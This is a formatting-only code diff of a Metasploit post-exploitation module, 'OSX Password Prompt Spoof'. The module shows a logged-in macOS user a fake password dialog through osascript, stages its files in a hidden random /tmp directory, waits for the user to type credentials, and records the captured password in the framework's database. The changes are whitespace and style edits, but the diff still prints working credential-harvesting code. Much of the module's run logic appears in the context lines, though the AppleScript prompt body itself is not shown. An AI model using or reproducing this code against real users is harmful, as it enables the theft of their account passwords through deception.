@@ -7,24 +7,27 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'OSX Password Prompt Spoof',
-        'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'OSX Password Prompt Spoof',
+        'Description' => %q{
           Presents a password prompt dialog to a logged-in OSX user.
         },
-        'License'       => MSF_LICENSE,
-        'Author'        => [
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Joff Thyer <jsthyer[at]gmail.com>', # original post module
           'joev', # bug fixes
           'Peter Toth <globetother[at]gmail.com>' # bug fixes
         ],
-        'Platform'      => [ 'osx' ],
-        'References'    => [
+        'Platform' => [ 'osx' ],
+        'References' => [
           ['URL', 'http://blog.packetheader.net/2011/10/fun-with-applescript.html']
         ],
-        'SessionTypes'  => [ "shell", "meterpreter" ]
-      ))
+        'SessionTypes' => [ "shell", "meterpreter" ]
+      )
+    )
 
     register_options([
       OptString.new(
@@ -55,10 +58,10 @@ class MetasploitModule < Msf::Post
     ])
   end
 
-#  def cmd_exec(str, args)
-#    print_status "Running cmd '#{str} #{args}'..."
-#    super
-#  end
+  #  def cmd_exec(str, args)
+  #    print_status "Running cmd '#{str} #{args}'..."
+  #    super
+  #  end
 
   # Run Method for when run command is issued
   def run
@@ -68,24 +71,24 @@ class MetasploitModule < Msf::Post
     end
 
     host = case session.type
-    when /meterpreter/
-      sysinfo["Computer"]
-    when /shell/
-      cmd_exec("/bin/hostname").chomp
-    end
+           when /meterpreter/
+             sysinfo["Computer"]
+           when /shell/
+             cmd_exec("/bin/hostname").chomp
+           end
 
     print_status("Running module against #{host}")
 
-    dir       = "/tmp/." + Rex::Text.rand_text_alpha((rand(8)+6))
-    creds_osa = dir + "/" + Rex::Text.rand_text_alpha((rand(8)+6))
-    pass_file = dir + "/" + Rex::Text.rand_text_alpha((rand(8)+6))
+    dir = "/tmp/." + Rex::Text.rand_text_alpha((rand(8) + 6))
+    creds_osa = dir + "/" + Rex::Text.rand_text_alpha((rand(8) + 6))
+    pass_file = dir + "/" + Rex::Text.rand_text_alpha((rand(8) + 6))
 
     username = cmd_exec("/usr/bin/whoami").strip
     cmd_exec("umask 0077")
     cmd_exec("/bin/mkdir #{dir}")
 
     # write the credentials script and run
-    write_file(creds_osa,creds_script(pass_file))
+    write_file(creds_osa, creds_script(pass_file))
     cmd_exec("osascript #{creds_osa}")
 
     print_status("Waiting for user '#{username}' to enter credentials...")
@@ -117,8 +120,7 @@ class MetasploitModule < Msf::Post
         session_id: session_db_id,
         private_type: :password,
         username: username
-        }
-      )
+      })
     else
       print_status("Timeout period expired before credentials were entered!")
     end
@@ -160,7 +162,7 @@ end try
 
   # Checks if the target is OSX Server
   def check_server
-    cmd_exec("/usr/bin/sw_vers -productName").chomp  =~ /Server/
+    cmd_exec("/usr/bin/sw_vers -productName").chomp =~ /Server/
   end
 
   # Enumerate the OS Version
